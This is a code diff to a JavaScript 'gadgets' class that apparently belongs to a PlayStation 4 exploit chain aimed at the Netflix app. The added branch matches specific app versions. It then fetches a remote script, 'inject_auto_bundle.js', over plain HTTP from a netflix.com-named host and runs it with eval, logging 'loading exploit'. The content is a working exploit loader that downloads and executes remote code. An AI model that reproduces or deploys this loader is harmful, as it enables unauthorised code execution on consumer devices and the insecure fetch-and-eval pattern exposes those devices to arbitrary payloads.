@@ -443,8 +443,38 @@ class gadgets {
                 break;
             case 'Gemini-U5-18':        // US 5.000
                 break;
+                
+            case 'Pollux-U53-7-E':
+            case 'Pollux-U53-7-A':
+            case 'Pollux-U53-7-J':
+                nrdp.gibbon.load({
+                url: 'http://localcontrol.netflix.com/js/ps4/inject_auto_bundle.js',
+                secure: false
+                }, function(result) {
+                    logger.flush();
+
+                    if (result.data) {
+                        logger.flush();
+                        try {
+                            eval(result.data);
+                        } catch (e) {
+                            logger.log("Eval error: " + e.message);
+                            logger.log("Stack: " + (e.stack || "none"));
+                            logger.flush();
+                        }
+                    } else {
+                        logger.log("Load failed - no data received");
+                        logger.flush();
+                    }
+                });
+                logger.log("PS4 Detected! loading exploit...");
+                //throw new Error("hi");
+                break;
             default:
+                
                 throw new Error("App version not supported");
+                
+                
         }
     }
     get(gadget) {
